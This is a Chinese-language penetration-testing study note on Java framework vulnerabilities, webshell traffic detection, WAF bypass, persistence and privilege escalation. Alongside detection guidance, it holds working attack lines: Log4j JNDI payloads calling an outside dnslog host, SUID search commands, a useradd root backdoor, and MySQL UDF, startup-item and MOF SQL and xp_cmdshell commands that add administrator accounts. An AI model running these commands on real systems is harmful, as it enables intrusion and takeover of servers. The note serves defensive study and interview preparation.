合法的 Remember。

### 最新漏洞Apache Shiro 身份验证绕过漏洞（CVE-2022-40664）

在Apache Shiro1.10.0 之前，当通过RequestDispatcher 接口进行请求转发或请求包含时存在身份验证绕过漏洞

### 1、shiro简介

shiro是一个强大的简单易用的Java安全框架，主要用来更便捷的认证，授权，加密，会话管理。

### 2、shiro的身份认证工作流程

通过前端传入的值，获取rememberME cookie，base64加密，AES加密（对称加解密），反序列化

### 3、shiro反序列化漏洞原理

原理：

当用户勾选RememberMe并登录成功，Shiro会将用户的cookie值序列化，AES加密，接着base64编码后存储在cookie的rememberMe字段中，服务端收到登录请求后，会对rememberMe的cookie值进行base64解码，接着进行AES解密，然后反序列化。由于AES加密是对称式加密（key既能加密数据也能解密数据），所以当攻击者知道了AES key后，就能够构造恶意的rememberMe cookie值从而触发反序列化漏洞。

### 4、shiro漏洞利用

Shiro搭配spring时身份验证绕过漏洞分析（CVE-2020-1957）

Apache Shiro 628权限绕过漏洞（CVE-2020-2957）

Apache Shiro权限绕过漏洞（CVE-2020-13933）

目前来说Shiro危害比较大的就两个RCE漏洞，721漏洞的爆破速度太慢了，且成功率比较低。550漏洞相对来说比较好利用，但是漏洞数量已经很少了，可能某些内网比较老的机子还存在着。

1.2.4key是写在源码里的，找到key就可以构造攻击链，1.2.4之后的775key是随机生成的，但我们还可以构造cookie，尝试构造攻击链，shiro流量特征就是数据包含多个$$$符号，C参数含有base64编码

### 5、shiro流量特征

shiro流量特征就是数据包包含多个$$$符号，C参数含有base64编码

### 6、修复

在shiro程序前面加上一层带来openresty，配合lua脚本，过滤rememberme cookie，凡是在黑名单的都无法访问返回403

配置动态密钥，按照源码的方式新写一个密钥生成器

### 7、攻击特征

1.cookie头的rememberMe字段超长

2.解密rememberMe可获取异常信息

在线解密网站：https://vulsee.com/tools/shiroDe/shiroDecrypt.html https://simolin.cn/tools/shiro/

3.若有回显，可以看到执行的相关命令和回显结果

fastjson漏洞

1、原理

原理就是jdni注入，利用就是构造一个json字符，用@type指定一个类库、

利用 fastjson autotype 在处理 json 对象的时候，未对@type 字段进行完全的安全性验证，攻击者可以传入危险类，并调用危险类连接远程 rmi 主机，通过其中的恶意类执行代码。

2、流量特征

流量特征就是json autotype

正常请求是 get 请求，没有请求体，可以构造错误的 post 请求，看响应包中是否有 fastjson 关键字。

3、利用

执行远程命令，获取服务数据

执行远程命令，植入后门，控制服务器

4、漏洞修复

升级至安全版本

对fastjson进行一定的安全加固措施

采用其他json处理组件替换，jackson-databind漏洞也频发，建议使用Gson

使用WAF紧急漏洞拦截，再升级到安全版本

5、Fastjson<1.2.24远程代码执行(CNVD-2017-02833 )

fastjson在解析json的过程中，支持使用autoType来实例化某一个具体的类，并调用该类的setlget方法来访问属性。通过查找代码中相关的方法，即可构造出—些恶意利用链。

漏洞利用

1、访问存在漏洞的页面，得到json格式的数据

2、创建Touchfile.java文件

3、执行编译命令javac TouchFile.java，得到TouchFile.class文件，并将其通过python3 -m http.server命令放到外网环境中，默认监听端口8080

4、然后我们借助marshalsec项目，启动一个RMI服务器，监听9999端口，并制定加载远程类TouchFile.class

5、在漏洞页面bp抓包后POST提交数据，替换payload

判断： 正常请求是 get 请求并且没有请求体，可以通过构造错误的 POST 请求，即可查看 在返回包中是否有 fastjson 这个字符串来判断。

原理：

fastjson 是阿里巴巴开发的一款将 json 字符串和 java 对象进行序列化和反序列 化的开源 json 解析库。fastjson 提供了 autotype 功能，在请求过程中，我们可 以在请求包中通过修改@type 的值，来反序列化为指定的类型，而 fastjson 在反 序列化过程中会设置和获取类中的属性，如果类中存在恶意方法，就会导致代码执 行等这类问题。

无回显怎么办：

1.一种是直接将命令执行结果写入到静态资源文件里，如 html、js 等，然后通过 http 访问就可以直接看到结果 2.通过 dnslog 进行数据外带，但如果无法执行 dns 请求就无法验证了 3.直接将命令执行结果回显到请求 Poc 的 HTTP 响应中

weblogic

1、wenlogic xml反序列化漏洞

通过xmldecoder导致的xml解析代码执行，弱口令

流量特征

不加密，常见的出网协议也可以用，有很多T3协议的特征，文件操作和冰蝎一样有fileoutseream字段

2、Weblogic T3协议反序列化(CVE-2018-2628)漏洞

Weblogic Server中的RMI通信使用T3协议在Weblogic Server和其它Java程序(客户端或者其它Weblogic Server实例)之间传输数据,服务器实例会跟踪连接到应用程序的每个Java虚拟机(JVM)中,并创建T3协议通信连接,将流量传输到Java虚拟机.T3协议在开放WebLogic控制台端口的应用上默认开启.攻击者可以通过T3协议发送恶意的的反序列化数据,进行反序列化,实现对存在漏洞的weblogic组件的远程代码执行攻击。

3、Weblogic lIOP协议反序列化(CVE-2020-2551)漏洞

llOP反序列化漏洞影响的协议为IIOP协议，该漏洞是由于调用远程对象的实现存在缺陷，导致序列化对象可以任意构造，在使用之前未经安全检查，攻击者可以通过ⅡOP协议远程访问Weblogic Server服务器上的远程接口，传入恶意数据，从而获取服务器权限并在未授权情况下远程执行任意代码.

### 4、Weblogic-SSRF 漏洞

SSRF形成的原因大都是由于服务端提供了从其他服务器应用获取数据的功能,且没有对目标地址做过滤与限制。比如从指定URL地址获取网页文本内容,加载指定地址的图片、文档等等。

Weblogic中存在一个SSRF漏洞，利用该漏洞可以发送任意HTTP请求，进而攻击内网中redis、fastcgi等脆弱组件。

# log4j漏洞

原理：log4j2框架下的lookup服务提供了{}字段解析功能，传进去的值会被直接解析，JNDI服务会请求远程服务来链接本地对象，这时候只用在{}里面调用JNDI服务即可反弹shell到指定服务器

特征：数据包里有{jndi:ladp//}字段

原理：log4j 远程代码执行漏洞 Log4j 是 Apache 的一个开源项目，是一款基于 Java 的开源日志记录工具。 该漏洞主要是由于日志在打印时当遇到`${`后，以:号作为分割，将表达式内容分 割成两部分，前面一部分 prefix，后面部分作为 key，然后通过 prefix 去找对应 的 lookup，通过对应的 lookup 实例调用 lookup 方法，最后将 key 作为参数带入 执行，引发远程代码执行漏洞。

具体操作： 在正常的 log 处理过程中对${这两个紧邻的字符做了检测，一旦匹配到类似于 表达式结构的字符串就会触发替换机制，将表达式的内容替换为表达式解析后的内 容，而不是表达式本身，从而导致攻击者构造符合要求的表达式供系统执 行

### log4j2 原理、有做过复现没？

影响版本：Apache Log4j 2.x<=2.15.0.rc1

原理：存在 JNDI 注入漏洞，当程序将用户输入的数据被日志记录时，即可触 发此漏洞，成功利用此漏洞可以在目标服务器上执行任意远端代码。

攻击过程：构建一个恶意用户名${jndi:ladp://z2xcu7.dnslog.cn/exp}， 然后触发日志记录(可以借助 DNSLog 生成临时域名用于查看测试是否生效）

# struts2 框架

### 漏洞原理

(1)struts 是 java 的 web 框架

(2)采取 OGNL 表达式，处理 view 层数据字符串到 controller 层转换成 java 对象

S2-046 和 S2-045 一样 S2-045 影响范围较大—-通过 Content-Type 这个 header 头，进而执行 命令，通过 Strus2 对错误消息处理进行回显

### 攻击特征

url中会出现的攻击特征主要是:

...*.action?method | ?redirect:${...}

conten-type中出现的攻击特征主要有:

%{#context

报文体中出现的攻击特征主要有:

\#_memberAccess

1.content-type出现异常字段，非MIME类型标识

2.字段格式为典型的注入代码格式%{ognl}

3.存在命令执行方法java.lang.ProcessBuilder().start()

4.执行命令"whoami”，返回包中返回执行成功信息"root”

5.出现类似于"3345*23565”的日志，通常都是扫描器扫描的日志

# Spring框架漏洞

## 漏洞原理

1.Spring Security OAuth2 远程命令执行（CVE-2016-4977）Spring Security OAuth2是为Spring框架提供安全认证支持的一个模块。Spring Security OAuth2处理认证请求的时候如果使用了whitelabel views，response_type参数值会被当做Spring SpEL来执行，攻击者可以在被授权的情况下通过构造response_type值也就是通过构造恶意SpEL表达式可以触发远程代码执行漏洞。故是在需要知道账号密码的前提下才可以利用该漏洞。

## Spring框架特征

1.看web应用程序的ico小图标，是一个小绿叶子

2.看报错页面，如果默认报错页面没有修复，那就是长这样

3.wappalyzer插件识别

4.f12看X-Application-Context头 有spring

# ThinkPHP 框架漏洞

## 漏洞原理

ThinkPHP 5.0 命令执行漏洞

Thinkphp5.0版本中没有对路由中的控制器进行严格过滤，没有开启强制路由的情况下可以执行系统命令

ThinkPHP 5.1x 命令执行漏洞

在ThinkPHP5.1.23之前的版本中存在SQL注入漏洞，该漏洞是由于程序在处理order by 后的参数时，未正确过滤处理数组的key值所造成。如果该参数用户可控，且当传递的数据为数组时，会导致漏洞的产生。

## 攻击特征

1.访问URL：/index/think\app/invokefunction

2.关键PHP函数：call_user_func_array、system、exec、shell_exec、eval

# fastjson反序列化

fastjson1.2.24反序列化漏洞原理

1、fastjson提供的反序列化功能允许用户传入json格式数据局的时候通过@type的value值指定任意反序列化类名

2、fastjson的反序列化机制会将反序列的类进行实例化对象，并调用该对象的setter和部分getter方法

3、恶意用户可以构造payload是目标应用的代码执行流程进入这部分setter和getter方法，如果这些方法中存在Gadget，就会造成一些安全问题。

4、官方采取黑名单过滤的方法，对反序列化的类名进行校验，checkAutoType不断被绕过

fastjson利用流程：

使用@type的value字段执行反序列化的类，例如JdbcRowSetImpl这个类，接着将这个类中的成员变量datasourcename的value值设为rmi远程加载类，这样fastjson在将传入的类反序列化、实例对象后，会通过成员变量传入的value值，请求rmi服务器，最后rmi返回远程类，fastjson执行这个远程恶意类。导致rce漏洞。

fastjson反序列化的特征：

在请求包中查找json格式的字符串，重点在于rmi和一些出网操作

判断： 正常请求是 get 请求并且没有请求体，可以通过构造错误的 POST 请求，即可查看 在返回包中是否有 fastjson 这个字符串来判断。

原理： fastjson 是阿里巴巴开发的一款将 json 字符串和 java 对象进行序列化和反序列 化的开源 json 解析库。fastjson 提供了 autotype 功能，在请求过程中，我们可 以在请求包中通过修改@type 的值，来反序列化为指定的类型，而 fastjson 在反 序列化过程中会设置和获取类中的属性，如果类中存在恶意方法，就会导致代码执 行等这类问题。

无回显怎么办： 1.一种是直接将命令执行结果写入到静态资源文件里，如 html、js 等，然后通过 http 访问就可以直接看到结果 2.通过 dnslog 进行数据外带，但如果无法执行 dns 请求就无法验证了 3.直接将命令执行结果回显到请求 Poc 的 HTTP 响应中

Shiro 反序列化漏洞

原理：

Shiro 是 Apache 下的一个开源 Java 安全框架，执行身份认证，授权，密码和会话 管理。shiro 在用户登录时除了账号密码外还提供了可传递选项 remember me。用 户在登录时如果勾选了 remember me 选项，那么在下一次登录时浏览器会携带 cookie 中的 remember me 字段发起请求，就不需要重新输入用户名和密码。

判断：

1.数据返回包中包含 rememberMe=deleteMe 字段。

2.直接发送原数据包，返回的数据中不存在关键字可以通过在发送数据包的 cookie 中增加字段：rememberMe=然后查看返回数据包中是否存在关键字。

Shiro-550：

shiro 反序列化漏洞利用有两个关键点，首先是在 shiro<1.2.4 时，AES 加密的密

钥 Key 被硬编码在代码里，只要能获取到这个 key 就可以构造恶意数据让 shiro 识

别为正常数据。另外就是 shiro 在验证 rememberMe 时使用了 readObject 方法，

readObject 用来执行反序列化后需要执行的代码片段，从而造成恶意命令可以被

执行。攻击者构造恶意代码，并且序列化，AES 加密，base64 编码后，作为

cookie 的 rememberMe 字段发送。Shiro 将 rememberMe 进行编码，解密并且反序列

化，最终造成反序列化漏洞。

Shiro-721：

不需要 key，利用 Padding Oracle Attack 构造出 RememberMe 字段后段的值结合

合法的 Remember。

# shiro550反序列化

原理：

导致shiro反序列化的主要原因就是shiro提供的记住密码功能，当用户打开这个功能时会在请求阿包中生成一个cookie，cookie的value值是经过反序列->aes加密->base64加密后的字符串，关键在于aes加密的秘钥是默认的，如果没有修改这个秘钥，就会导致反序列化漏洞，攻击者可以构造恶意代码，将恶意代码序列化-aes加密-base64加密后传入cookie，这样就导致RCE漏洞。

特征：shiro是一个身份验证组件，一般用在登录模块，登录失败会有一个失败标识rememberme=deleteme，如果返回包中存在该字段则说明可能存在反序列化漏洞。

# weblogic xml反序列化

原理：xml反序列化，这是wls security组件对外提供的webserver页面，通过xmlDecoder功能来解析用户的xml数据导致的任意字符串被当做代码去执行

特征：服务器开放7001端口 传递xml数到wls-wsat 数据包内容有bash或者dnslog字段。

# Apache Solr

Solr中存在VelocityResponseWriter组件,攻击者可以构造特定请求修改相关配置,使VelocityResponseWriter组件允许加载指定模板,进而导致Velocity模版注入远程命令执行漏洞，攻击者利用该漏洞可以直接获取到服务器权限。

漏洞产生原因:

在其 5.0.0 到 8.3.1版本中，用户可以注入自定义模板，通过Velocity模板语言执行任意命令。

参考：(https://www.cnblogs.com/yuzly/p/11782608.html)

# CVE-2022-40664 ShiroFilter1.7和1.10对于forward请求的处理

# 漏洞复现

### Apache Log4j2 RCE漏洞利用反弹shell合集

Bugku靶场 地址：https://ctf.bugku.com/challenges/detail/id/340.html

访问地址，可见一个登录框

这里使用dnslog进行探测，dnslog平台 ——> [DNSLOG Platform](https://dig.pm/)

在用户名字段插入poc，密码字段因为数据加密了所以不行

在用户名输入 ${jndi:ldap://e4953331.dns.1433.eu.org.}

dns平台接收如下，说明漏洞存在![img](file:///C:\Users\Tralong\AppData\Local\Temp\ksohtml16720\wps62.jpg)

再输入一个bypass payload，dns平台都能接收

${${lower:j}${lower:n}${lower:d}i:${lower:rmi}://e4953331.dns.1433.eu.org./poc}

### Fastjson 1.2.24 反序列化导致任意命令执行

\1. 环境搭建

利用vulhub的环境，执行docker-compose up -d ，启动环境

![img](file:///C:\Users\Tralong\AppData\Local\Temp\ksohtml16720\wps63.jpg)

访问8090，出现如下说明环境搭建成功

![img](file:///C:\Users\Tralong\AppData\Local\Temp\ksohtml16720\wps64.jpg)

我们向这个地址POST一个JSON对象，即可更新服务端的信息：

curl http://192.168.140.158:8090/ -H "Content-Type: application/json" --data '{"name":"xzc", "age":23}'

### 漏洞复现 ｜ CVE-2022-0847内核提权漏洞（POC已公开）

这是 CVE-2022-0847 的故事，它是自 5.8 以来 Linux 内核中的一个漏洞，它允许覆盖任意只读文件中的数据。这会导致权限提升，因为非特权进程可以将代码注入根进程。

该漏洞已 在 Linux 5.16.11、5.15.25 和 5.10.102 中修复。

漏洞检测

检测的方法比较简单。直接在终端输入 uname -r ,如果内核版本是在5.8和5.16.11之间那说明可能受到该漏洞的影响。我这里的版本是5.9在影响范围内。

环境部署

部署环境时推荐打一个快照复现完成后恢复快照

这里使用Kali复现，现在内核版本为5.9先尝试一下看是否能提权成功。因为POC使用python编写且要求版本为python3.10及往上，需要先将python升级为3.10。步骤如下

漏洞复现

现在下载POC进行验证

# 常见的webshell连接工具流量？

## 中国菜刀

连接过程中使用base64编码对发送的指令进行加密，其中两个关键payload z1 和 z2，名字都是可变的。

然后还有一段以QG开头，7J结尾的固定代码。

## 蚁剑

默认的user-agent请求头是antsword xxx，不过可以修改。

一般将payload进行分段，然后分别进行base64编码，一般具有像eval这样的关键字，然后呢大概率还有@ini_set("display","0");这段代码。

## 哥斯拉

1.jsp代码中可能会具有getclass，getclassLoader等关键字，payload使用base64编码等特征。php和asp则是普通的一句话木马。

2.在响应包的cache-control字段中有no-store，no-cache等特征。

3.所有请求中的cookie字段最后面都存在；特征。

## Behinder（冰蝎）流量特征

冰蝎是一款基于java开发的动态加密通信流量的新型webshell客户端，冰蝎的通信过程可以分为两个阶段：秘钥协商 加密传输

冰蝎2：ua头比较老，虽然内置了10余种，每次连接shell都会随机选择一个进行使用，由于比较老，容易被检测出来

content-length：16 #16是冰蝎2连接的特征#

冰蝎3：冰蝎3取消了动态秘钥获取 accept头有application/xhtml+xmlapplication/xmlapplication/signed-exchange属于弱特征

ua头版本老：冰蝎3内置16个ua头都比较老，现实生活中使用较少。

## 冰蝎

php代码中可能存在eval，assert等关键词，jsp代码中可能会有getclass()，getclassLoader()等字符特征。

冰蝎2.0

第一阶段请求中返回包的状态码是200，返回内容是16位的密钥。建立连接后的cookie格式都是Cookie：PHPSessid=xxxx ；path=/；特征。

冰蝎3.0

请求包中的conten-length字段是5740或者5720，然后请求头也具有特征信息，不过这个比较长，没有记住。

冰蝎4.0

由于通信流量被加密，传统的 WAF、IDS 设备难以检测，给威胁狩猎带来较大挑战。冰蝎其最大特点就是对交互流量进行对称加密，且加密密钥是由随机数函数动态生成，因此该客户端的流量几乎无法检测。

2、工具通信原理

冰蝎的通信过程可以分为两个阶段：密钥协商和加密传输

第一阶段-密钥协商

1.攻击者通过 GET 或者 POST 方法，形如 http://127.0.0.1/shell.aspx?pass=645的请求服务器密钥；

2.服务器使用随机数 MD5 的高16位作为密钥，存储到会话的 $_SESSION 变量中，并返回密钥给攻击者。

第二阶段-加密传输

1）客户端把待执行命令作为输入，利用 AES 算法或 XOR 运算进行加密，并发送至服务端；

2）服务端接受密文后进行 AES 或 XOR 运算解密，执行相应的命令；

3）执行结果通过AES加密后返回给攻击者。

特征检测：

### 1、Accept字段

流量特征

Accept: application/json, text/javascript, */*; q=0.01

检测思路

浏览器可接受任何文件，但最倾向application/json和 text/javascript

规则

file_data的作用和http_server_body差不多，都是使content匹配response body中的内容，唯一不同的是使用了file_data关键字的规则，其在file_data之后的content都会受到它的影响。file_data之后的content都必须在response body里匹配。。

### 2、Content-Type

流量特征

Content-type: Application/x-www-form-urlencoded

检测思路

可以把这个字段作为一个弱特征，辅助其他特征来检测

### 3、User-agent 字段

流量特征

冰蝎设置了10种User-Agent,每次连接shell时会随机选择一个进行使用。

检测思路

在较短较简单的content字段后加上fast_pattern关键字则会优先匹配这个content。避免浪费太长时间在匹配user-agent上。

snort编写可以用content："User-Agent”；content："浏览器版本”。来匹配相应的十个浏览器。

### 4、端口

流量特征

冰蝎与webshell建立连接的同时，javaw也与目的主机建立tcp连接，每次连接使用本地端口在49700左右，每连接一次，每建立一次新的连接，端口就依次增加。

检测思路

可以对符合该范围内的端口告警。

### 5、PHP webshell 中存在固定代码

流量特征

$post=Decrypt(file_get_contents("php://input"));

eval($post);

检测思路

content字段中，将eval($post)作为流量特征纳入。

### 6、长连接

流量特征

冰蝎通讯默认使用长连接，避免了频繁的握手造成的资源开销。默认情况下，请求头和响应头里会带有 Connection。

Connection: Keep-Alive

检测思路

可以作为辅助的流量特征。

### 7、固定的请求头和响应头

流量特征

请求字节头：

dFAXQV1LORcHRQtLRlwMAhwFTAg/M

响应字节头：

TxcWR1NNExZAD0ZaAWMIPAZjH1BFBFtHThcJSlUXWEd

### 8、连接密码

流量特征：

默认时，所有冰蝎4.0 webshell都有"e45e329feb5d925b” 一串密钥。该密钥为连接密码32位md5值的前16位，默认连接密码rebeyond

### 9、webshell特征

JSP webshell代码特征

![img](file:///C:\Users\Tralong\AppData\Local\Temp\ksohtml16720\wps65.jpg)

PHP webshell代码特征

![img](file:///C:\Users\Tralong\AppData\Local\Temp\ksohtml16720\wps66.jpg)

### 10、请求和响应

![img](file:///C:\Users\Tralong\AppData\Local\Temp\ksohtml16720\wps67.jpg)

![img](file:///C:\Users\Tralong\AppData\Local\Temp\ksohtml16720\wps68.jpg)

冰蝎连接时不用输入密码，根据对冰蝎的使用分析，冰蝎4.0可以在初始时自定义连接密码。

要设置自定义密码，需要在本地和远程加解密函数中都保存$key。

这样的话，如果对方更换密码，初始字符串经过密钥加密，那么它的请求头和响应头都会发生变化，这就需要针对webshell中的$key动态改变解密函数才能得到解密后固定的请求头和响应头

另外，每次发起连接时都会发出两次http请求，默认连接密钥下，所有响应头都相同，第二次请求头比较特殊，初次之外，所有的请求头都相同。

第一次请求解密

dFAXQV1LORcHRQtLRlwMAhwFTAg/M

@error_reporting(0);\r

第二次请求解密

OT8AQUBWFDoQUBRWQEELC1MdVRoJNGwDF1sHTVtaDEVZVAxdGh0RDQNBAU9X

error_reporting(0);\r

# 绕WAF方法和WAF分类

### 1、注入绕WAF方法

通过工具burp上的bypass上的WAF模块，或者修改User anget头

通过sqlmap脚本挂temper

修改请求方式，比如一般默认拦截get请求，可以把get修改成post

复合参数绕过

编码绕过

通过内联注释 比如/*!10440*/

特殊字符替换空格

特殊字符拼接

大小写绕过

双写绕过

异或绕过

求余绕过

组合法绕过 比如 内联注释+编码绕过 大小写+双写绕过

分块传输绕过

### 2、文件上传绕过

等号绕过 比如加双等号

换行绕过

填充垃圾字符

突破0，文件名前缀加[0x09]绕过

文件名去掉双引号绕过

### 3、XSS绕过WAF

大小写绕过

Javascript伪协议绕过 （例子：<table background="javascript:alert(1)"></table>。其中引号可以去掉

支持Javascript伪协议的属性有：img,href,lowsrc,bgsound,background,action,dynsrc）

没有分号

HTML5 新标签绕过

Fuzz进行测试

双层标签绕过

"”包裹的js代码利用空格、回车、tab键

双引号、单引号被过滤的情况 （用反单引号绕过、编码绕过）

括号被过滤的情况（用throw来绕过 ）

url地址被过滤的情况（使用url编码、使用ip地址（十进制ip、八进制ip、十六进制ip）

用//代替http：// ）

### 4、WAF方面有没有了解过，清楚WAF的分类和原理吗？

分类：

WAF分为非嵌入型WAF和嵌入型WAF，非嵌入型指的是硬WAF、云WAF、虚拟机WAF之类的；嵌入型指的是web容器模块类型WAF、代码层WAF。

原理：

Web应用防火墙是通过执行一系列针对HTTP或者HTTPS的安全策略来专门为Web应用提供保护的一款产品。WAF对请求的内容进行规则匹配、行为分析等识别出恶意行为，并执行相关动作，这些动作包括阻断、记录、告警等。

# Webshell免杀

### 字符串变形

\1. 简单字符串拼接

\2. 利用字符串函数 base64_decode 使用base64加参数加密

分离免杀 把马拆分成两个部分

在线加密

通过NTFS交换数据流文件实现文件隐藏

变量覆盖

组合法

# Webshell问题

### 进网站后台如何拿webshell

1、进网站后台找文件上传的部分，采用白名单黑名单条件竞争、中间件解析漏洞进行传一个马过去

2、数据库备份成一个脚本文件，把一句话木马插入进行，上传的时候传一个图片木马，通过数据库备份成脚本文件，进行连接

3、修改网站后台的配置文件，有一些介绍扩展名是一些脚本扩展名，只要我们在这里面修改的时候，就可以把一句话木马插进去，连接这个配置脚本文件就可以连接上去

4、修改一些模板，在后台找到一些相关的功能，里面如果是一些代码，就可以进行插入一句话木马，大马直接替换过去

5、数据库执行的地方，后台可以执行SQL语句，把一句话木马通过union select 模式把一句话木马导入到指定路径上去，再进行访问

### 如何拿一个网站的 webshell（网站拿 shell 方法有哪些思路）？

文件上传漏洞，后台编辑模板，sql 注入写文件，命令执行，代码执行， 一些已经爆 出的 cms 漏洞，比如 dedecms 后台可以直接建立脚本文件，wordpress 上传插件包含脚本 文件 zip 压缩包等

### 网站被上传webshell如何处理？

1.首先关闭网站，下线服务。有必要的话将服务器断网隔离。

2.手工结合工具进行检测。

工具方面比如使用D盾webshellkill，河马webshell查杀，百度在线webshell查杀等工具对网站目录进行排查查杀，如果是在护网期间可以将样本备份再进行查杀。

手工方面对比未上传webshell前的备份文件，从文件甚至代码层面进行对比，检查有无后门程序或者其他异常文件，实在不行就直接用备份文件替换了。

4.加强安全策略，比如定期备份网站配置文件，及时安装服务器补丁，定期更新组件以及安全防护软件，定期修改密码等等措施。

### webshell检测思路？

静态检测：匹配特征码，特征值，危险函数

动态检测：WAF、IDS等设备

日志检测：通过IP访问规律，页面访问规律筛选

文件完整性监控

### 权限维持的方法

CS

MSF生成单独的exe码

Dll劫持的shift后门 五下shift后门

修改注册表 比如把后门添加到启动项 影子账户

计划任务 几点几分运行木马

进程注入

Rootkit

端口复用

协议后门 ICMP协议 ping一个指定的包的大小 触发后门连接

注册表自启动

shift后门

远控软件

webshell

添加管理用户

影子用户

定时任务

dll劫持

注册表劫持

MBR后门

WMI后门

管理员密码记录

Linux:

SSH后门

SUID后门

Crontab计划任务

PAM后门

添加管理员账号

Rootkit

# 系统提权

。

### 1、Windows提权

1.系统漏洞提权

在有webshell命令行执行systeminfo命令查看系统是否打了提权补丁，没有打补丁可通过github下载系统提权漏洞exp进行提权

1.systeminfo查看操作系统详细信息，补丁更新等情况

2.在tasklist中查看到的进程中使用taskkill/im +进程名称  或taskkill/pid +进程id终止杀毒软件或防护软件

3.根据系统版本和补丁信息，查找未打补丁的漏洞

4.上传相应漏洞的exp，然后使用cmd模块进行提权

2.绕过系统UAC提升

可通过msf里面的getsystem绕过UAC,也可以通过kali模块的exploit/windows/local/bypassuac_injection、exploit/windows/local/bypassuac_vbs 、exploit/windows/local/ask 绕过 UAC

\3. 不安全的服务权限提升

即使正确引用了服务路径，也可能存在其他漏洞。由于管理配置错误，用户可能对服务 拥有过多的权限，例如，我们用木马替换服务调用的默认文件。

### 2、Linux系统提权

\1. 内核提权

使用nc或lcx反弹到攻击者的电脑，再uname -a 查看Linux版本内核等系统信息

在exploit库中找到相对应的系统版本号和内核漏洞利用模块

上传exp到目标服务器，chmod 777赋予exp权限

提权后添加ssh用户（useradd -o -u 0 -g 0 username）

通过webshell上传ft.pl 再进行反弹shell kali开始监听

1、 首先通过 uname –a 查看 linux 版本号，根据 linux 版本号到 kail 里面通过 searchsploit linux XX 系统 版本号找出对应的 exp 进行提权或根据版本号到 github 上面下载对应的 exp 编译运行提权。

2、通过通杀 linux 的方法测试一下脏牛提权

3、直接 suid 提权，先通过以下三行命令找出具有本地查找符合条件具备 root 权限的 suid 文件，

如：/usr/bin/find examples.desktop -exec whoami \; find / -user root -perm -4000 -print 2>/dev/null find / -perm -u=s -type f 2>/dev/null find / -user root -perm -4000 -exec ls -ldb {} \;

4、通过漏洞 sudo 提权

Linux提权

方法：比较多是通过内核溢出的方式，先查看内核版本，找内核对应版本的漏洞进行溢出。溢出成功，提升为root权限

内核溢出提权

查看内核

Uname -r

反弹shell执行命令

上传exp

编译执行

根据内核版本查找对应漏洞

收集exp 可以从www.exploit.db.com中查找漏洞利用

Mysql udf提权

上传库文件

执行库文件创建命令执行函数

利用suid提权

寻找系统里可以用的suid文件来提权

$ find / -perm -u=s -type f 2>/dev/null

利用环境变量劫持高权限程序提权

查找可操作文件

$ find / -perm -u=s -type f 2>/dev/null

利用file命令查看文件是否可执行

执行该文件

执行的时候可能会报错，根据报错查看调用系统命令

利用低权限用户目录下可被root权限用户调用的脚本提权

设置bash的$path环境变量

调用cat命令时，cat会从上级目录寻找。当我们添加.到path环境变量的时候，会先从当前目录寻找cat指令

新建cat，添加执行权限

再次运行./msgmike命令的时候，就会触发当前目录下的cat(/bin/sh)，从而提权。root权限

### 3、数据库提权

mysql提权

1、 通过 UDF 提权；2、通过 mof 提权；3、通过数据库语句写入启动项提权

UDF提权：

获取到对方的mysql数据库下的root账号密码

查看网站源码里数据库配置文件（inc,conn,config.sql,common,data）

查看数据库安装路径下的user.myd(/data/mysql/)

暴力破解mysql密码，3306端口入侵

UDF提权的原理：通过root权限导出udf.dll到系统目录下，可以通过udf.dll调用执行cmd

Windows两个导出dll

2000 C:\Winnt\udf.dll

2003 C:\Windows\udf.dll

5.1以下的版本，需要将udf导入到system32中；5.1以上的版本，需要导出到安装目录lib\plugin\

Udf脚本内容：

Create function cmdshell returns string soname ‘udf.dll’

Select cmdshell(‘net user test 123456/add’);

Select cmdshell (‘net localgroup administrators test/add’);

Drop function cmdshell; 删除函数

启动项提权：

查看有哪些数据表

Mysql>show tables;

默认情况下，test中没有任何表存在

在test数据库中创建一个表

Mysql> create table a(cmd test);

在表中插入内容

Insert into a values ("set wshshell=createobject("”wscript.shell””)”);

Insert into a values ("a=wshshell.run ("”cmd.exe /c net user test 123456 /add””,0)”);

Insert into a values ("b=wshshell.run("”cmd.exe /c net localgroup administrators test /add””,0)”);

这三条命令创建一个vbs脚本，然后导入到开机启动项

Select * from a into outfile "c://documents//administrator//开始菜单//程序//启动//a.vbs

重启即可

Mof提权

1 上传mof.php

输入相关信息 执行cmd命令 提权

2 上传文件x.mof

使用select命令导出到正确位置

Select load_file(‘C:/wmpub/nullevt.mof’) into dumpfile ‘c:/windows/system32/wbem/mof/nullevt.mof’

设置允许外连

Grant all privileges on *.* to ‘root’@’%’ identified by ‘root’ with grant option;

MOF文件每隔5秒就会执行，且执行命令时的权限为系统权限，如果通过MYSQL将MOF文件替换，那么系统就会每隔5秒执行MOF文件，MOF文件中存在一段VBS脚本，因此控制VBS脚本内容变成让系统执行命令，进而提权

Mssql提权

利用存储过程脚本可以写入注册表来实

条件：mssql服务没有降权、有sa账号与密码

### 利用xp_cmdshell：

xp_cmdshell在mssql2005后是默认关闭的，若有sa权限可以将其开启

exec sp_configure 'show advanced options',1;reconfigure;exec sp_configure 'xp_cmdshell',1;reconfigure;

执行系统命令：

exec master.dbo.xp_cmdshell 'ipconfig'//查看ip信息exec master..xp_cmdshell 'net user test 12345 /add' //添加用户exec master..xp_cmdshell 'net user localgroup administrators test /add' //添加

#### 利用SO_OACreate提权

#### 利用xp_rewrite提权

### 4、描述一下第三方应用软件提权方法？

1、Serv-u 安全性测试（分为有配置文件有修改权限与 servUDaemon.exe 默认管理员帐号 和密码没修改进行提权）

2、FlashFXP 安全性测试（攻击者只需通过 webshell 下载 quick.dat、sites.dat、 stats.dat 这三个文件进行本 地替换，就可以用星号查看器直接查看连接密码）

3、Gene6 FTP 安全性测试（Gene6 FTP 默认安装路径是 C:\Program Files\Gene6 FTP Server\RemoteAdmin\Remote.ini 其中 Remote.ini 是主配置文件，管理员登录的 ip、端口 和密码都存储在这。但 Gene 6 管理员帐号只充许本地登录。 对于渗透测试人员来讲只需要通过 Webshell 转发端口就 可以进行远程连接）

4、PcanyWhere 安全性测试（找到 pcanywhere 安装目录下面的*.CIF 直接用工具破解密码 就行）

5、VNC 安全性测试（通过脚本大马读取 VNC 连接密码： HKEY_LOCAL_MACHINE\SOFTWARE\RealVNC\WinVNC4\password）

6、Radmin 安全性测试（导出注册表 hash，用 Radmin 的 hash 版连接就行）

7、Zend 安全性测试（攻击者只需要通过 webshell 对原 ZendExtensionManager.dll 重命 名，并通过工具重新生成一个来木马 ZendExtensionManager.dll 让 apche 重启加载。服务 器就会被控制）

8、启动项安全性测试

9、服务替换安全性测试

10、Dll 劫持安全性测试（直接用 Tools lpk sethc v4.0 生成 dll 马通过 webshell 上传 到杀毒软件，输入法等管理员常运行 exe 软件目录，等着 dll 劫持）

